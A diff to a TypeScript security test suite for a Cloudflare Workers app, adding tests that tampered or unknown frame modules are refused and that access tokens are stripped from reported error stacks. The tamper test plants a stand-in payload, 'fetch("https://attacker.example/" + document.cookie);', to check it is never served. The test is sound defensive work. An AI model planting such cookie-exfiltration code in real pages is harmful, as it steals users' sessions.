@@ -4,11 +4,11 @@ import { env } from "cloudflare:workers";
 import { describe, expect, it, vi } from "vite-plus/test";
 
 import { revokeRelease } from "../src/release-retention.ts";
-import { frameAccess, stageFrame } from "../src/screen-frame.ts";
+import { frameAccess, frameKey, stageFrame } from "../src/screen-frame.ts";
 import { release } from "./apps.ts";
 import { mockIdp } from "./idp.ts";
 import { deskDraft, deskFiles } from "./preview-drafts.ts";
-import { chatWithDraft } from "./previews.ts";
+import { chatsOf, chatWithDraft } from "./previews.ts";
 import {
   frameDocument,
   loadFrame,
@@ -49,6 +49,9 @@ import {
 // - Bytes changed in R2, or moved there from another scope, are served as
 //   if core staged them.
 // - Grasp staff mint a token, and so read App code, without an audit entry.
+// - A token leaves in what the frame reports: a stack or a message names
+//   a module's whole address, query and all, and is kept in the App's
+//   error log or a preview's reports, which reach the agent and its model.
 // - A shared cache keeps a module for others, or its address leaves as a
 //   Referer.
 
@@ -362,11 +365,24 @@ describe(
       const original = await staged?.text();
       // Whoever can write the bucket swaps the module's code, and keeps
       // what else core stored beside it.
-      await env.FILES.put(
-        key,
-        'fetch("https://attacker.example/" + document.cookie);',
-        { customMetadata: staged?.customMetadata ?? {} }
-      );
+      const tamper = async (): Promise<void> => {
+        await env.FILES.put(
+          key,
+          'fetch("https://attacker.example/" + document.cookie);',
+          { customMetadata: staged?.customMetadata ?? {} }
+        );
+      };
+      await tamper();
+      // The frame opened again: its import map would vouch for the bytes.
+      const reopened = await frameDocument(opened);
+      const atOpen = {
+        status: reopened.status,
+        cache: reopened.headers.get("cache-control"),
+        module: (await env.FILES.head(key)) === null,
+        manifest: (await env.FILES.head(frameKey(opened.artifact))) === null,
+      };
+      // Or the frame already open asks for it.
+      await tamper();
       const tampered = await routed(pathOf(address));
       const removed = (await env.FILES.head(key)) === null;
       // Or moves another chat's module into this scope, with its MAC.
@@ -389,6 +405,7 @@ describe(
       );
       const healed = await routed(pathOf(address));
       expect({
+        atOpen,
         tampered: {
           status: tampered.status,
           cache: tampered.headers.get("cache-control"),
@@ -398,6 +415,12 @@ describe(
         sameModule: updated.refresh.entry === modulePartsOf(address).hash,
         healed: { status: healed.status, code: await healed.text() },
       }).toStrictEqual({
+        atOpen: {
+          status: 404,
+          cache: "no-store",
+          module: true,
+          manifest: true,
+        },
         tampered: { status: 404, cache: "no-store" },
         removed: true,
         moved: 404,
@@ -490,24 +513,79 @@ describe(
       const opened = await builder.api.chats.preview(chatId, app, "desk");
       const frame = await framed(opened);
       const own = modulePartsOf(screenModuleOf(frame));
-      const [document, served, refused] = await Promise.all([
+      const [document, served, refused, missing] = await Promise.all([
         frameDocument(opened),
         routed(modulePath(own)),
         routed(modulePath({ ...own, token: "1.AAAA" })),
+        // A hash kept nowhere, under the frame's own valid token.
+        routed(modulePath({ ...own, hash: "0".repeat(64) })),
       ]);
       expect({
-        document: headersOf(document).referrer,
+        document: {
+          cache: headersOf(document).cache,
+          referrer: headersOf(document).referrer,
+        },
         served: headersOf(served),
         refused: headersOf(refused),
+        missing: headersOf(missing),
       }).toStrictEqual({
-        document: "no-referrer",
+        document: { cache: "no-store", referrer: "no-referrer" },
         served: {
           status: 200,
           cache: "private, max-age=3600, immutable",
           referrer: "no-referrer",
         },
         refused: { status: 403, cache: "no-store", referrer: "no-referrer" },
+        missing: { status: 404, cache: "no-store", referrer: "no-referrer" },
       });
+    });
+
+    it("keeps no token from a reported stack or message in the App's error log or a preview's reports", async () => {
+      const builder = await signedInApi(idp, "builder");
+      const { app, chatId, revision } = await deskDraft(builder);
+      const frame = await framed(
+        await builder.api.chats.preview(chatId, app, "desk")
+      );
+      const published = await framed(
+        await builder.api.screens.open(app, "desk")
+      );
+      const artifact = `/package-artifacts/${app}/${"c".repeat(64)}/${"d".repeat(64)}/index.js?token=${modulePartsOf(screenModuleOf(published)).token}`;
+      // As engines write them: each frame names its module's whole address.
+      const problemOf = (address: string) => ({
+        kind: "error" as const,
+        message: `Failed to fetch dynamically imported module: ${address}`,
+        stack: `Error: boom\n    at Desk (${address}:3:9)\n    at load (https://acme.test${artifact}:1:2)`,
+      });
+      await builder.api.screens.report(
+        app,
+        { version: 1, screen: "desk" },
+        problemOf(screenModuleOf(published))
+      );
+      await builder.api.chats.previewReport(
+        chatId,
+        app,
+        revision,
+        "desk",
+        problemOf(screenModuleOf(frame))
+      );
+      const { entries } = await builder.api.screens.errors(app);
+      const reported = await chatsOf(builder).previewReports(
+        chatId,
+        app,
+        revision,
+        0
+      );
+      const tokens = [published, frame].map(
+        (opened) => modulePartsOf(screenModuleOf(opened)).token
+      );
+      const kept = JSON.stringify({ entries, problems: reported.problems });
+      const { pathname } = new URL(screenModuleOf(published));
+      expect({
+        withToken: tokens.filter((token) => kept.includes(token)),
+        withQuery: kept.includes("?token="),
+        // What the address says of where the module is stays.
+        path: kept.includes(`${pathname}:3:9`),
+      }).toStrictEqual({ withToken: [], withQuery: false, path: true });
     });
   }
 );
